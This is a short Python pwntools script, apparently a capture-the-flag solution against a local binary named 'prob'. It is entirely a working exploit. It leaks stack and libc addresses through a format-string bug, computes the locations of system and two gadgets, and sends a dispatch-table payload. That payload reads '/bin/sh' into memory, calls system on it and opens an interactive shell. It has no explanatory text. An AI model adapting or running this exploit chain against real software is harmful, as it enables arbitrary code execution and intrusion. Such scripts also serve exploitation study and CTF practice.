from pwn import *

p=process("./prob")

p.sendline(b"%lx %3$lx")

stack_addr=int(p.recv(10),16)
p.recv(1)
libc_addr=int(p.recv(10),16)

libc_base=libc_addr-0x1b4c40
libc_system=libc_base+0x40890
gadget1=libc_base+0x19c520
gadget2=libc_base+0x19c490
read_plt=0x400590

log.info("stack_addr:"+hex(stack_addr))
log.info("libc_base:"+hex(libc_base))
log.info("libc_system:"+hex(libc_system))

pay=b"A"*0x10
pay+=p64(stack_addr+0x20)
pay+=p64(gadget1)
#Dispatch Table 0 : read(0,0x411030,0x100)
pay+=p64(stack_addr+0x110)
pay+=b"B"*0x28
pay+=p64(read_plt)
pay+=b"C"*0xb0
pay+=p64(gadget2)
pay+=p64(stack_addr+0x1b0)
pay+=p64(gadget1)
pay+=b"D"*0x50
pay+=p64(0)
pay+=p64(0x411030)
pay+=p64(0x100)
pay+=b"E"*0x28

#Dispatch Table 1 : system(0x411030)
pay+=p64(stack_addr+0x2a0)
pay+=b"A"*0x28
pay+=p64(libc_system)
pay+=b"B"*0xb0
pay+=p64(gadget2)
pay+=b"C"*0x60
pay+=p64(0x411030)

p.send(pay)
p.send(b"/bin/sh\x00")

p.interactive()

